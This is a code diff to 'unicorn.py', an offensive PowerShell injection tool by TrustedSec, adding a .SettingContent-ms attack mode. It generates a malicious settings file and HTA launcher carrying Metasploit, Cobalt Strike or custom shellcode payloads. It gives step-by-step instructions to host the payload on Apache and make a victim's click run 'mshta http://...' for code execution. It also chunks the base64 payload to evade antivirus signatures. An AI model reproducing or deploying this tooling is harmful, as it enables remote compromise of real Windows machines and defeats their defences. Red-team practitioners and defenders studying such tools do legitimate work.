@@ -361,10 +361,72 @@ issues.
 [*******************************************************************************************************]
     """)
 
+# this is used for custom shellcode generation
+def settings_ms():
+    print("""
+[*******************************************************************************************************]
+
+                -----SettingContent-ms Extension Method----
+
+First, if you haven't had a chance, head over to the awesome SpectreOps blog from Matt Nelson (enigma0x3):
+
+https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39
+
+This method uses a specific file type called ".SettingContent-ms" which allows for the ability for both
+direct loads from browsers (open + command execution) as well as extension type through embedding in 
+office products. This one specifically will focus on extension type settings for command execution
+within Unicorn's PowerShell attack vector.
+
+There are multiple methods supported with this attack vector. Since there is a limited character size
+with this attack, the method for deployment is an HTA. 
+
+For a detailed understanding on weaponizing this attack visit:
+
+https://www.trustedsec.com/2018/06/weaponizing-settingcontent/
+
+The steps you'll need to do to complete this attack is generate your .SettingContent-ms file from
+either a standalone or hta. The HTA method supports Metasploit, Cobalt Strike, and direct
+shellcode attacks.
+
+The four methods below on usage: 
+
+HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
+HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms
+HTA Example SettingContent-ms: python unicorn.py <patth_to_shellcode.txt>: shellcode ms
+Generate .SettingContent-ms: python unicorn.py ms
+
+The first is a Metasploit payload, the second a Cobalt Strike, the third your own shellcode, and the fourth
+just a blank .SettingContent-ms file. 
+
+When everything is generated, it will export a file called Standalone_NoASR.SettingContent-ms either in
+the default root Unicorn directory (if using the standalone file generation) or under the hta_attack/
+folder. You will need to edit the Standalone_NoASR.SettingContent-ms file and replace:
+
+REPLACECOOLSTUFFHERE
+
+With:
+
+mshta http://<apache_server_ip_or_dns_name/Launcher.hta.
+
+Then move the contents of the hta_attack to /var/www/html.
+
+Once the victim either clicks the .SettingContent-ms file, mshta will be called on the victim machine
+then download the Unicorn HTA file which has the code execution capabilites. 
+
+Special thanks and kudos to Matt Nelson for the awesome research
+
+Usage: 
+
+python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
+python unicorn.py <cobalt_strike_file.cs cs ms
+python unicorn.py <patth_to_shellcode.txt>: shellcode ms
+python unicorn.py ms
+
+""")
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.1 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.2 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -378,14 +440,18 @@ def gen_usage():
     print("Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro")
     print("Macro Example Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode macro")
     print("HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta")
+    print("HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms")
     print("HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta")
+    print("HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms")
     print("HTA Example Shellcode: python unicorn.py <path_to_shellcode.txt>: shellcode hta")
+    print("HTA Example SettingContent-ms: python unicorn.py <patth_to_shellcode.txt>: shellcode ms")
     print("DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde")
     print("CRT Example: python unicorn.py <path_to_payload/exe_encode> crt")
     print("Custom PS1 Example: python unicorn.py <path to ps1 file>")
     print("Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500")
     print("Cobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)")
     print("Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00)")
+    print("Generate .SettingContent-ms: python unicorn.py ms")
     print("Help Menu: python unicorn.py --help\n")
 
 
@@ -436,7 +502,6 @@ def scramble_stuff():
     full_shell = list3[:-2]
 
     return full_exe + "," + ps_only + "," + full_wscript + "," + full_shell
-
 
 # generate full macro
 def generate_macro(full_attack, line_length=800):
@@ -705,11 +770,11 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
     ran3 = generate_random_string(2, 3)
     ran4 = generate_random_string(2, 3)
 
-    # honestly anti-virus is one of the most annoying programs ever created - it has nothing to do with security, but if something becomes popular, lets write a signature that annoys the author. So in this example, we say F A/V because it's literally terrible. What AV - i.e. Kaspersky in this case was doing was evaluating the base64 encoded command - so what do we do? Chunk it up because anti-virus is absolutely ridiculous. Of course this gets around it because it doesn't know how to interpret PowerShell. Instead, what you need to be looking for is long powershell statements, toString() as suspicious, etc. That'll never happen because A/V is suppose to be signature based on something they can catch. You all literally are a dying breed. Sorry for the rant, but it's annoying to have to sit here and rewrite stupid stuff because your wrote a shitty sig. -Dave
-    fuckav = base64.b64encode(powershell_code.encode('utf_16_le'))
+    # honestly anti-virus is one of the most annoying programs ever created - it has nothing to do with security, but if something becomes popular, lets write a signature that annoys the author. So in this example, we say F A/V because it's literally terrible. What AV - i.e. Kaspersky in this case was doing was evaluating the base64 encoded command - so what do we do? Chunk it up because anti-virus is absolutely ridiculous. Of course this gets around it because it doesn't know how to interpret PowerShell. Instead, what you need to be looking for is long powershell statements, toString() as suspicious, etc. That'll never happen because A/V is suppose to be signature based on something they can catch. You all literally are a dying breed. Sorry for the rant, but it's annoying to have to sit here and rewrite stupid stuff because your wrote a crummy sig. -Dave
+    avblah = base64.b64encode(powershell_code.encode('utf_16_le')) # kinder gentler dave variable name now
     # here we mangle our encodedcommand by splitting it up in random chunks
     avsux = randomint = random.randint(4000,5000)
-    avnotftw = [fuckav[i: i + avsux] for i in range(0, len(fuckav), avsux)]
+    avnotftw = [avblah[i: i + avsux] for i in range(0, len(avblah), avsux)]
     haha_av = ""
     counter = 0
     for non_signature in avnotftw:
@@ -726,12 +791,21 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
 
     # for cobalt strike
     if attack_type == "cs":
+
         if attack_modifier == "hta":
             gen_hta_attack(full_attack)
             cobalt_strike()
             hta_help()
-            print("[*] Exported the custom hta_attack vector to hta_attacks/. This folder contains everything you need for CS or your custom shellcode. Enjoy!\n")
 
+        if attack_modifier == "ms":
+            ms_voodoo_stuff()
+            gen_hta_attack(full_attack)
+            cobalt_strike()
+            shutil.move("Standalone_NoASR.SettingContent-ms", "hta_attack/")
+            settings_ms()
+            print("[*] Exported SettingContent-ms and all HTA attack stuff to hta_attack as Standalone_NoASR.SettingContent-ms, Launcher.hta, and index.html.")
+            print("[*] Edit the Standalone_NoASR.SettingContent-ms and replace the section 'REPLACECOOLSTUFFHERE' with something like mshta http://<ip_or_dns_to_server/Launcher.hta")
+            print("[*] Example step: Start Apache and move contents of hta_attack/ to /var/www/html/, and edit .SettingContent-ms with mshta http://<ip_of_apache>.")
 
         elif attack_modifier == "macro":
             macro_attack = generate_macro(full_attack)
@@ -750,7 +824,17 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
             gen_hta_attack(full_attack)
             custom_shellcode()
             hta_help()
-            print("[*] Exported the hta attack vector to hta_attacks/. This folder contains everything you need. Enjoy!\n")
+            print("[*] Exported the hta attack vector to hta_attack/. This folder contains everything you need. Enjoy!\n")
+
+        elif attack_modifier == "ms":
+            ms_voodoo_stuff()
+            gen_hta_attack(full_attack)
+            custom_shellcode()
+            shutil.move("Standalone_NoASR.SettingContent-ms", "hta_attack/")
+            settings_ms()
+            print("[*] Exported SettingContent-ms and all HTA attack stuff to hta_attack as Standalone_NoASR.SettingContent-ms, Launcher.hta, and index.html.")
+            print("[*] Edit the Standalone_NoASR.SettingContent-ms and replace the section 'REPLACECOOLSTUFFHERE' with something like mshta http://<ip_or_dns_to_server/Launcher.hta")
+            print("[*] Example step: Start Apache and move contents of hta_attack/ to /var/www/html/, and edit .SettingContent-ms with mshta http://<ip_of_apache>.")
 
         elif attack_modifier == "macro":
             macro_attack = generate_macro(full_attack)
@@ -774,6 +858,17 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
             # move unicorn to hta attack if hta specified
             shutil.move("unicorn.rc", "hta_attack/")
             hta_help()
+
+        elif attack_modifier == "ms":
+            ms_voodoo_stuff()
+            gen_hta_attack(full_attack)
+            custom_shellcode()
+            shutil.move("Standalone_NoASR.SettingContent-ms", "hta_attack/")
+            shutil.move("unicorn.rc", "hta_attack/")
+            settings_ms()
+            print("[*] Exported SettingContent-ms and all HTA attack stuff to hta_attack as Standalone_NoASR.SettingContent-ms, Launcher.hta, and index.html.")
+            print("[*] Edit the Standalone_NoASR.SettingContent-ms and replace the section 'REPLACECOOLSTUFFHERE' with something like mshta http://<ip_or_dns_to_server/Launcher.hta")
+            print("[*] Example step: Start Apache and move contents of hta_attack/ to /var/www/html/, and edit .SettingContent-ms with mshta http://<ip_of_apache>.")
 
         else:  # write out powershell attacks
 
@@ -838,6 +933,16 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
         print("[*] Exported powershell output code to powershell_attack.txt")
 
 
+# This is the SettingContent-ms filetype based on research here: https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39
+def ms_voodoo_stuff():
+    # read file content in
+    ms_input = file("templates/Standalone_NoASR.SettingContent-ms", "r").read()
+    # write the content out
+    filewrite = file("Standalone_NoASR.SettingContent-ms", "w")
+    filewrite.write(ms_input)
+    filewrite.close()
+    settings_ms()
+
 # pull the variables needed for usage
 try:
     attack_type = ""
@@ -856,6 +961,11 @@ try:
             cobalt_strike()
             gen_usage()
             sys.exit()
+
+        # settings option for SettingContent-ms filetype attack vector
+        if sys.argv[1] == "ms":
+            attack_type = ("ms")
+
         else:
             if len(sys.argv) > 2 and sys.argv[2] == "crt":
                 attack_type = "crt"
@@ -870,9 +980,13 @@ try:
 
             elif sys.argv[2] == "cs":
                 attack_type = "cs"
+
                 # using hta attack within custom shellcode or cobalt strike
                 if "hta" in sys.argv: 
                     attack_modifier = "hta"
+
+                if "ms" in sys.argv:
+                    attack_modifier = "ms"
 
                 # using macro attack within custom shellcode or co balt strike
                 if "macro" in sys.argv:
@@ -906,12 +1020,14 @@ try:
             print("[!] File not found. Check the path and try again.")
             sys.exit()
         payload = file(sys.argv[1], "r").read()
+
         if attack_type == "cs":
             #if not "char buf[] =" in payload:
             if not "byte[] buf = new byte" in payload:
                 if not " byte buf[]" in payload:
                     print("[!] Cobalt Strike file either not formatted properly or not the C#/CS format.")
                     sys.exit()
+
             payload = payload.split("{")[1].replace(" };", "").replace(" ", "") # stripping out so we have 0x00 format
             #payload = payload.split(' char buf[] = "')[1].replace("\\x", ",0x").replace(",", "", 1).replace('";', "")
 
@@ -920,7 +1036,8 @@ try:
         ps = gen_shellcode_attack(payload, ipaddr, port)
         if attack_modifier != "hta":
             if attack_modifier != "macro":
-                attack_modifier = ("cs")
+                if attack_modifier != "ms":
+                    attack_modifier = ("cs")
 
         format_payload(ps, attack_type, attack_modifier, None)
 
@@ -966,9 +1083,13 @@ try:
         if attack_type == "custom_ps1":
             ps = gen_ps1_attack(ps1path)
             format_payload(ps, attack_type, None, None)
+
+        # here we start the magic voodoo stuff for SettingContent-ms
+        elif attack_type == "ms":
+            ms_voodoo_stuff()
+
         else:
-            print(
-                "[!] Options not understood or missing. Use --help switch for assistance.")
+            print("[!] Options not understood or missing. Use --help switch for assistance.")
             sys.exit()
 
     # if we did supply parameters
